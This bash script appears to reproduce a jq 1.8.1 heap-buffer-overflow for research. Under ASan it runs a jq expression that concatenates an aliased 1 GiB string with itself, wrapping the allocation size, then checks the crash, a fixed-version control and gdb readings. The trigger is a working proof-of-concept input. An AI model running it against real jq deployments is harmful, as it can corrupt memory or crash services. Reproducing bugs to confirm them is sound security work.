#!/bin/bash
# jq2shell real-process wrapped geometry via string aliasing (2026-11-23).
#
# jq strings are refcounted. jv_string_concat passes the *same* jv string as
# both operands of jvp_string_append, so a single ~1 GiB jv string reaches
# currlen + len = 0x80000000 with only ~1 GiB of physical data -- inside the
# unchanged 2 GiB wake-slice guard. This drives that geometry through a real
# ASan jq 1.8.1 process at the pinned source lines, with fixed-1.8.2 and
# small-input controls. It is rung 3/4 mechanics in a live jq process, not
# rung 5: no request/wire input, pointer control or side effect.
set -eu
cd "$(dirname "$0")/.."
ROOT=$PWD
BUILD=$ROOT/build
OUT=$ROOT/live/evidence
mkdir -p "$BUILD/alias" "$OUT"

# Builds both pinned trees, verifies pins and records the current cgroup.
bash "$ROOT/live/real-jq.sh" > /dev/null

VULN=$BUILD/jq-jq-1.8.1
FIXED=$BUILD/jq-jq-1.8.2
PROG='("x"*1073741824) as $s | ($s+$s) | length'
export LC_ALL=C

: > "$OUT/alias-summary.out"
: > "$OUT/alias-asan.out"
: > "$OUT/alias-gdb.out"

# Safe control: same alias expression, small input, vulnerable binary.
safe=$(cd "$VULN" && LD_LIBRARY_PATH="$VULN/.libs" \
  ASAN_OPTIONS=detect_leaks=0 timeout 60s ./.libs/jq \
  -n '("x"*1000) as $s | ($s+$s) | length')
test "$safe" = 2000
echo "SAFE len=$safe" >> "$OUT/alias-summary.out"

# Wrapped geometry in a real vulnerable process: the ASan report is the
# observed overflow; only fixed, normalized tokens are kept in Git.
set +e
(cd "$VULN" && LD_LIBRARY_PATH="$VULN/.libs" \
  ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 timeout 180s \
  ./.libs/jq -n "$PROG") > "$BUILD/alias/vuln.out" 2>&1
vuln_rc=$?
set -e
test "$vuln_rc" = 134
echo "VULN rc=$vuln_rc" >> "$OUT/alias-summary.out"
{
  grep -o 'ERROR: AddressSanitizer: heap-buffer-overflow' "$BUILD/alias/vuln.out"
  grep -o 'WRITE of size 1073741824' "$BUILD/alias/vuln.out"
  grep -oE 'jvp_string_append src/jv\.c:1191' "$BUILD/alias/vuln.out" | head -1
  grep -oE 'jv_string_concat src/jv\.c:1501' "$BUILD/alias/vuln.out" | head -1
  grep -oE 'binop_plus src/builtin\.c:96' "$BUILD/alias/vuln.out" | head -1
  grep -oE '[0-9]+-byte region' "$BUILD/alias/vuln.out" | head -1
} > "$OUT/alias-asan.out"
test "$(wc -l < "$OUT/alias-asan.out")" = 6

# Fixed control: 1.8.2 rejects the same geometry before allocating.
set +e
fixmsg=$(cd "$FIXED" && LD_LIBRARY_PATH="$FIXED/.libs" \
  ASAN_OPTIONS=detect_leaks=0 timeout 120s ./.libs/jq -n "$PROG" 2>&1)
fix_rc=$?
set -e
test "$fix_rc" = 5
test "$fixmsg" = 'jq: error (at <unknown>): String too long'
echo "FIXED rc=$fix_rc msg=String too long" >> "$OUT/alias-summary.out"

# gdb reads the real arithmetic at the pinned allocation line. The
# conditional breakpoint skips the small append inside jv_string_repeat.
cat > "$BUILD/alias/gdb-alias.cmd" <<'EOF'
set pagination off
set breakpoint pending on
break src/jv.c:1189 if currlen == 1073741824
commands
silent
printf "GEOM ALIAS currlen=%u len=%u allocsz=%u\n", currlen, len, (currlen+len)*2
bt 5
continue
end
run -n '("x"*1073741824) as $s | ($s+$s) | length'
EOF
(cd "$VULN" && LD_LIBRARY_PATH="$VULN/.libs" \
  ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 timeout 180s \
  gdb -q -batch -x "$BUILD/alias/gdb-alias.cmd" --args ./.libs/jq) \
  > "$BUILD/alias/gdb-alias.raw" 2>&1
grep -E '^(GEOM|#[0-9])' "$BUILD/alias/gdb-alias.raw" |
  sed -E 's/0x[0-9a-f]+/0xADDR/g; s#/[^ ]*/src/#SRC/#g' \
  > "$OUT/alias-gdb.out"
grep -q '^GEOM ALIAS currlen=1073741824 len=1073741824 allocsz=0$' \
  "$OUT/alias-gdb.out"
grep -q 'jvp_string_append.*src/jv.c:1189' "$OUT/alias-gdb.out"
grep -q 'jv_string_concat.*src/jv.c:1501' "$OUT/alias-gdb.out"

cat "$OUT/alias-summary.out"
cat "$OUT/alias-asan.out"
echo ALIAS-GEOM-PASS
